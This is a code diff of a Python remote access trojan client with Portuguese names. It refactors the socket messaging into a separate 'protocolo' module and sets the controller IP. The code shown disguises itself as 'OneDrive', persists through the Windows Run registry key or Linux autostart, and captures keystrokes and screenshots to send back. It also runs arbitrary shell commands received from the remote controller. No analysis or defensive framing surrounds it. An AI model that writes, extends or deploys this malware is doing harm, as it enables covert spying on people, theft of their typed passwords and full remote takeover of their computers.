@@ -6,6 +6,7 @@ import sys
 import platform
 import struct
 import io
+import protocolo
 from datetime import datetime
 from time import sleep
 from pynput import keyboard
@@ -15,9 +16,8 @@ IS_WINDOWS = os.name == "nt"
 if IS_WINDOWS:
     import winreg
 
-IP = "coloque o ip aqui"
+IP = "127.0.0.1"
 PORT = 443
-
 PROGRAM_NAME = "OneDrive"
 REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 AUTOSTART_DIR = os.path.expanduser("~/.config/autostart")
@@ -150,33 +150,11 @@ def setup_persistence():
     except (OSError, PermissionError) as e:  
         print(f"[-] Persistence failure: {e}")
 
-def enviar_dados_estruturados(client_socket, dados_brutos):
-    try:
-        cabecalho = struct.pack(">I", len(dados_brutos))
-        client_socket.sendall(cabecalho + dados_brutos)
-    except socket.error as e:
-        raise OSError(f"Network stream failure: {e}")
-
-def receber_bytes_exatos(sock, tamanho_esperado):
-    dados_acumulados = b""
-    while len(dados_acumulados) < tamanho_esperado:
-        pacote = sock.recv(tamanho_esperado - len(dados_acumulados))
-        if not pacote:
-            raise ConnectionResetError("Conexão fechada pelo servidor.")
-        dados_acumulados += pacote
-    return dados_acumulados
-
-def ler_mensagem_do_protocolo(sock):
-    bytes_do_tamanho = receber_bytes_exatos(sock, 4)
-    tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
-    payload_bruto = receber_bytes_exatos(sock, tamanho_do_payload)
-    return payload_bruto
-
 def connect(ip, port):
     try:
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c.connect((ip, port))
-        enviar_dados_estruturados(c, "[#] Client connected\n".encode("utf-8"))
+        protocolo.enviar_mensagem(c, "[#] Client connected\n")
         return c
     except OSError as e:
         print(f"[-] Connection failed to {ip}:{port}: {e}")
@@ -190,11 +168,13 @@ def listen(c):
             if buffer_auto_send_pending:
                 data = get_keylog_data()
                 if data:
-                    enviar_dados_estruturados(c, data.encode("utf-8"))
+                    protocolo.enviar_mensagem(c, data)
                 buffer_auto_send_pending = False
 
             try:
-                payload = ler_mensagem_do_protocolo(c)
+                payload = protocolo.receber_mensagem(c)
+                if payload is None:
+                    break
                 command = payload.decode("utf-8").strip()
                 if not command:
                     continue
@@ -205,25 +185,25 @@ def listen(c):
                 break
             elif command == "/screenshot":
                 img_data = capture_screenshot()
-                enviar_dados_estruturados(c, img_data)
+                protocolo.enviar_mensagem(c, img_data)
             elif command == "/keylog_start":
                 res = start_keylogger()
-                enviar_dados_estruturados(c, res.encode("utf-8"))
+                protocolo.enviar_mensagem(c, res)
             elif command == "/keylog_dump":
                 res = get_keylog_data()
                 if not res:
                     res = "[i] Keylog buffer empty\n"
-                enviar_dados_estruturados(c, res.encode("utf-8"))
+                protocolo.enviar_mensagem(c, res)
             elif command == "/keylog_stop":
                 res = stop_keylogger()
-                enviar_dados_estruturados(c, res.encode("utf-8"))
+                protocolo.enviar_mensagem(c, res)
             else:
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout, stderr = proc.communicate()
                 output = stdout + stderr
                 if not output:
                     output = b"[+] Command executed (No output)\n"
-                enviar_dados_estruturados(c, output)
+                protocolo.enviar_mensagem(c, output)
         except (RuntimeError, OSError) as e_err:
             print(f"[-] Connection or state error: {e_err}")
             break
